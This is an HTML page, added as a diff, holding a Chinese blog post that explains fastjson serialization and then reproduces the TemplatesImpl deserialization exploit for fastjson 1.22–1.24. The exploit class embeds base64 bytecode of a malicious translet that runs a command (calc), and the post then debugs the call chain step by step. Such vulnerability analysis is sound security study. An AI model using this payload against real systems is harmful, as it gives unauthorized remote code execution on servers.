@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="什么是fastjson？FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化与JNDI注入">
+<meta property="og:url" content="http://example.com/2023/08/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="什么是fastjson？FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson3.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson4.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson7.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson8.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson9.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson10.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson11.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson12.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson13.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson14.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson15.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson16.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson17.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson18.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson19.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson20.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson21.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson22.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson23.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson24.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson25.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson26.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson28.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson27.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson29.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson30.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson31.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson33.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson32.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson34.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson35.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson37.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson36.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson38.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson39.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson40.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson42.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson43.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson44.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson45.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson46.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson47.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/fastjson48.png">
+<meta property="article:published_time" content="2023-08-05T03:18:11.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:39:49.344Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/fastjson1.png">
+
+<link rel="canonical" href="http://example.com/2023/08/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>fastjson反序列化与JNDI注入 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/05/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          fastjson反序列化与JNDI注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-05 11:18:11" itemprop="dateCreated datePublished" datetime="2023-08-05T11:18:11+08:00">2023-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:39:49" itemprop="dateModified" datetime="2025-05-25T11:39:49+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="什么是fastjson？"><a href="#什么是fastjson？" class="headerlink" title="什么是fastjson？"></a>什么是fastjson？</h2><p>FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。其实简单的来说就是处理json格式的数据的。例如将json转换成一个类。或者是将一个类转换成一段json数据。</p>
+<span id="more"></span>
+
+<h2 id="fastjson的简单使用"><a href="#fastjson的简单使用" class="headerlink" title="fastjson的简单使用"></a>fastjson的简单使用</h2><p>创建一个User类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    public String username;</span><br><span class="line">    public String password;</span><br><span class="line"></span><br><span class="line">    public user(String username, String password) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        return username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassword() &#123;</span><br><span class="line">        return password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个test类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;ycxlo&quot;,&quot;123&quot;);</span><br><span class="line">        String s = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson1.png" alt="img"></p>
+<p>再来看看另一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;ycxlo&quot;,&quot;123&quot;);</span><br><span class="line">        String s = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson2.png" alt="img"></p>
+<p>第二个参数 <code>SerializerFeature.WriteClassName</code> 是一个枚举值，表示要在 JSON 字符串中包含类名。</p>
+<p>在和前面代码做对比后，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得Fastjson支持自省（自省是指在运行时检查类的属性、方法和构造函数等信息，并在不提前知道类结构的情况下进行操作），开启自省后序列化成<code>JSON</code>的数据就会多一个@type，这个是代表对象类型的<code>JSON</code>文本。FastJson的漏洞就是他的这一个功能去产生的，在对该JSON数据进行反序列化的时候，会去调用指定类中对于的get&#x2F;set&#x2F;is方法。</p>
+<p>上面是序列化的使用，接下来我们再看看反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;ycxlo&quot;,&quot;123&quot;);</span><br><span class="line">        String s = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        User user1 = JSON.parseObject(s,User.class);</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样会有个异常，我们需要稍稍改变一下User类，添加一个无参构造方法，输出结果</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson3.png" alt="img"></p>
+<p>如果parseObject中没有第二个参数，则返回一个JSONObject对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;ycxlo&quot;,&quot;123&quot;);</span><br><span class="line">        String s = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        JSONObject user1 = JSON.parseObject(s);</span><br><span class="line">        System.out.println(user1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//&#123;&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;ycxlo&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两段代码中，可以发现用了<code>JSON.parseObject</code>和 <code>JSON.parse</code>这两个方法，<code>JSON.parseObject</code>方法中没指定对象，返回的则是<code>JSONObject</code>的对象。<code>JSON.parseObject</code>和 <code>JSON.parse</code>这两个方法差不多，<code>JSON.parseObject</code>的底层调用的还是<code>JSON.parse</code>方法，只是在<code>JSON.parse</code>的基础上做了一个封装。</p>
+<p>在序列化时，<code>FastJson</code>会调用成员对应的<code>get</code>方法，被<code>private</code>修饰且没有<code>get</code>方法的成员不会被序列化，</p>
+<p>而反序列化的时候在，会调用了指定类的全部的<code>setter</code>，<code>publibc</code>修饰的成员全部赋值。我们可以简单测试一下</p>
+<p>User.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">public class User &#123;</span><br><span class="line">    public String username;</span><br><span class="line">    public String password;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public User(String username, String password) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        System.out.println(&quot;this is getter&quot;);</span><br><span class="line">        return username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        System.out.println(&quot;this is setter&quot;);</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getPassword() &#123;</span><br><span class="line">        return password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setPassword(String password) &#123;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行上段代码，结果为：</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson4.png" alt="img"></p>
+<p><strong>漏洞点：由于序列化数据是从客户端发送的，如果将type属性修改成恶意的类型，再发送过去，而接收方进行正常的反序列化操作时，不就可以实现任意类的反序列化操作！！！</strong></p>
+<h2 id="反序列化漏洞复现"><a href="#反序列化漏洞复现" class="headerlink" title="反序列化漏洞复现"></a>反序列化漏洞复现</h2><p>主要有两种攻击方式，一个是使用TemplatesImpl类，另一个是JdbcRowSetImpl类</p>
+<p>环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastjson 1.22-1.24</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class POC_Tem &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAMgoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24KABMAFgwAFwAGAQAPcHJpbnRTdGFja1RyYWNlBwAZAQAfbWFpbi9qYXZhL2NjMi9UZXN0VGVtcGxhdGVzSW1wbAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAIUxtYWluL2phdmEvY2MyL1Rlc3RUZW1wbGF0ZXNJbXBsOwEADVN0YWNrTWFwVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEAIQAYAAIAAAAAAAMAAQAFAAYAAQAaAAAAfAACAAIAAAAWKrcAAbgABxINtgAPV6cACEwrtgAVsQABAAQADQAQABMAAwAbAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASABwAAAAWAAIAEQAEAB0AHgABAAAAFgAfACAAAAAhAAAAEAAC/wAQAAEHABgAAQcAEwQAAQAiACMAAgAaAAAAPwAAAAMAAAABsQAAAAIAGwAAAAYAAQAAABYAHAAAACAAAwAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAmACcAAgAoAAAABAABACkAAQAiACsAAgAaAAAASQAAAAQAAAABsQAAAAIAGwAAAAYAAQAAABoAHAAAACoABAAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAsAC0AAgAAAAEALgAvAAMAKAAAAAQAAQApAAEAMAAAAAIAMQ==\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(s, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/fastjson5.png" alt="img"></p>
+<p>一些对于exp的解释</p>
+<ul>
+<li>@type ：用于存放反序列化时的目标类型，这里指定的是<code>TemplatesImpl</code>这个类，Fastjson会按照这个类反序列化得到实例，因为调用了<code>getOutputProperties</code>方法，实例化了传入的bytecodes类，导致命令执行。需要注意的是，Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code> 在parseObject中才能触发；</li>
+<li>_bytecodes：继承<code>AbstractTranslet</code> 类的恶意类字节码，并且使用<code>Base64</code>编码</li>
+<li>_name：调用<code>getTransletInstance</code> 时会判断其是否为null，为null直接return，不会往下进行执行，利用链就断了，可参考cc2和cc4链。</li>
+<li>_tfactory：<code>defineTransletClasses</code> 中会调用其<code>getExternalExtensionsMap</code> 方法，为null会出现异常,但在前面分析jdk7u21链的时候，部分jdk并未发现该方法。</li>
+<li>outputProperties：漏洞利用时的关键参数，由于Fastjson反序列化过程中会调用其<code>getOutputProperties</code> 方法，导致<code>bytecodes</code>字节码成功实例化，造成命令执行。</li>
+</ul>
+<p>前面说到的之所以加入<code>Feature.SupportNonPublicField</code>才能触发是因为<code>Feature.SupportNonPublicField</code>的作用是支持反序列化使用非public修饰符保护的属性。</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson6.png" alt="img"></p>
+<p>可以看到TemplatesImpl类中基本是private属性，因此在Fastjson中需要加入<code>Feature.SupportNonPublicField</code>，而这种方式并不多见。</p>
+<h2 id="调试分析Templates链"><a href="#调试分析Templates链" class="headerlink" title="调试分析Templates链"></a>调试分析Templates链</h2><p>在JSON.parseObject处下断点即可</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson7.png" alt="img"></p>
+<p>需要传入4个参数，input是我们的payload，clazz是反序列化后对应的类（就是obj对象的类），config就是ParseConfig对象，features参数为反序列化反序列化private属性所用到的一个参数。继续调用一个重载方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson8.png" alt="img"></p>
+<p>将features的掩码值赋给featureValues，然后实例化一个DefaultJSONParser，而后调用parser.parseObject()方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson9.png" alt="img"></p>
+<p>两个if条件均不满足，调用config.getDeserializer()方法，这个方法应该就是获取一个反序列化配置，而后调用derializer.deserialze方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson10.png" alt="img"></p>
+<p>进行一个三次判断，显然第二个判断是不成立的</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson11.png" alt="img"></p>
+<p>所以调用parser.parse方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson12.png" alt="img"></p>
+<p>这里调用的是DefaultJSONParser的parse方法，我们先回到当时实例化DefaultJSONParser类的时候</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson13.png" alt="img"></p>
+<p>又实例化了一个JSONScanner对象，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson14.png" alt="img"></p>
+<p>这个方法是用于解析json数据的，回去，继续调用DefaultJSONParser的重载方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson15.png" alt="img"></p>
+<p>lexer是一个JSONScanner对象，调用getCurrent()方法就是返回ch的值，也就是{，</p>
+<p>回到DefaultJSONParser的parse方法，对lexer的token进行一个判断，此时为12，而LBRACE对应的值便为12</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson16.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson17.png" alt="img"></p>
+<p>又实例化了一个JSONObject对象，其中还调用了lexer.isEnabled方法，跟进一下</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson18.png" alt="img"></p>
+<p>这里返回的是false，可以验证一下</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson19.png" alt="img"></p>
